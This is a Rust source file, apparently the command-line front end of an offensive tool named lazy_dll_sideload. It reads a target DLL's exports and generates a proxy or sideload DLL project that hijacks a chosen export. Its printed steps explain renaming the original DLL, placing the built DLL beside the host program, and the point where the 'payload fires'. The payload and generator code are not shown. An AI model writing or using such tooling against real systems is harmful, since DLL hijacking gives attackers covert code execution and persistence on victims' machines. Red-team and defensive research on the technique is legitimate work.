use std::env;
use std::path::Path;
use std::process;

use getopts::Options;
use lazy_dll_sideload::generate::{generate, hijack_present, write_project, GenOpts, Mode};
use lazy_dll_sideload::pe::parse_pe_exports;

fn main() {
    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();

    let mut opts = Options::new();
    opts.optopt("m", "mode", "Mode: proxy or sideload", "MODE");
    opts.optopt("p", "path", "Path to target DLL", "PATH");
    opts.optopt("e", "export", "Export to hijack", "EXPORT");
    opts.optopt(
        "n",
        "name",
        "Original DLL name after rename (relative proxy)",
        "ORIG_NAME",
    );
    opts.optflag("h", "help", "Print this help");

    let matches = match opts.parse(&args[1..]) {
        Ok(m) => m,
        Err(f) => {
            eprintln!("[!] {f}");
            print_usage(&program, &opts);
            process::exit(1);
        }
    };

    if matches.opt_present("h") || args.len() == 1 {
        print_usage(&program, &opts);
        return;
    }

    let mode_str = matches.opt_str("m").unwrap_or_default();
    let dll_path_str = matches.opt_str("p").unwrap_or_default();
    let hijack_export = matches.opt_str("e").unwrap_or_default();

    if mode_str.is_empty() || dll_path_str.is_empty() || hijack_export.is_empty() {
        eprintln!("[!] -m, -p, and -e are required");
        print_usage(&program, &opts);
        process::exit(1);
    }

    let mode = match mode_str.to_ascii_lowercase().as_str() {
        "proxy" => Mode::Proxy,
        "sideload" => Mode::Sideload,
        other => {
            eprintln!("[!] unknown mode '{other}' (use proxy or sideload)");
            process::exit(1);
        }
    };

    let dll_path = Path::new(&dll_path_str);
    if !dll_path.exists() {
        eprintln!("[!] DLL not found: {}", dll_path.display());
        process::exit(1);
    }
    let dll_stem = match dll_path.file_stem().and_then(|s| s.to_str()) {
        Some(s) => s.to_string(),
        None => {
            eprintln!("[!] could not read DLL file name");
            process::exit(1);
        }
    };

    let default_orig = format!("{dll_stem}_orig.dll");
    let original_dll_name = matches.opt_str("n").unwrap_or(default_orig);
    let absolute = dll_path.is_absolute();

    let exports = match parse_pe_exports(dll_path) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[!] failed to parse exports: {e}");
            process::exit(1);
        }
    };

    if exports.is_empty() {
        eprintln!("[!] no exports found in {}", dll_path.display());
    } else {
        println!("[*] {} named/ordinal exports", exports.len());
    }

    if !hijack_present(&exports, &hijack_export) {
        eprintln!(
            "[!] export '{}' is not in the name table. generating it anyway.",
            hijack_export
        );
    }

    let gen = GenOpts {
        mode,
        dll_path: dll_path.to_path_buf(),
        dll_stem: dll_stem.clone(),
        hijack_export: hijack_export.clone(),
        original_dll_name: original_dll_name.clone(),
        absolute,
    };
    let project = generate(&gen, &exports);
    let root = Path::new(&project.package_name);

    if let Err(e) = write_project(root, &project) {
        eprintln!("[!] write failed: {e}");
        process::exit(1);
    }

    match mode {
        Mode::Proxy if absolute => {
            print_proxy_warning_absolute(&dll_path_str, &hijack_export);
            if dll_path_str.contains(' ') {
                eprintln!("[!] absolute path has spaces. MSVC .def forwarders choke on that.");
            }
        }
        Mode::Proxy => print_proxy_warning(&dll_stem, &original_dll_name, &hijack_export),
        Mode::Sideload => print_sideload_warning(&dll_stem, &hijack_export),
    }

    if project.package_name != dll_stem {
        println!(
            "[*] cargo package name is '{}' (DLL stem '{}'). rename the built cdylib if the host loads a different file name.",
            project.package_name, dll_stem
        );
    }

    println!("[+] project generated: ./{}", project.package_name);
}

fn print_usage(program: &str, opts: &Options) {
    let brief = format!("Usage: {program} -m proxy|sideload -p <dll> -e <export> [-n orig.dll]");
    print!("{}", opts.usage(&brief));
}

fn print_proxy_warning(dll_stem: &str, orig_name: &str, export: &str) {
    println!();
    println!("[!] PROXY (relative)");
    println!("    1. rename {dll_stem}.dll -> {orig_name}");
    println!("    2. drop the built DLL + {orig_name} next to the host");
    println!("    3. payload fires on {export}");
    println!();
}

fn print_proxy_warning_absolute(original_path: &str, export: &str) {
    println!();
    println!("[!] PROXY (absolute path)");
    println!("    1. original loaded from {original_path}");
    println!("    2. no rename");
    println!("    3. payload fires on {export}");
    println!();
}

fn print_sideload_warning(dll_stem: &str, export: &str) {
    println!();
    println!("[!] SIDELOAD");
    println!("    1. put {dll_stem}.dll next to the host");
    println!("    2. host calls {export}");
    println!();
}
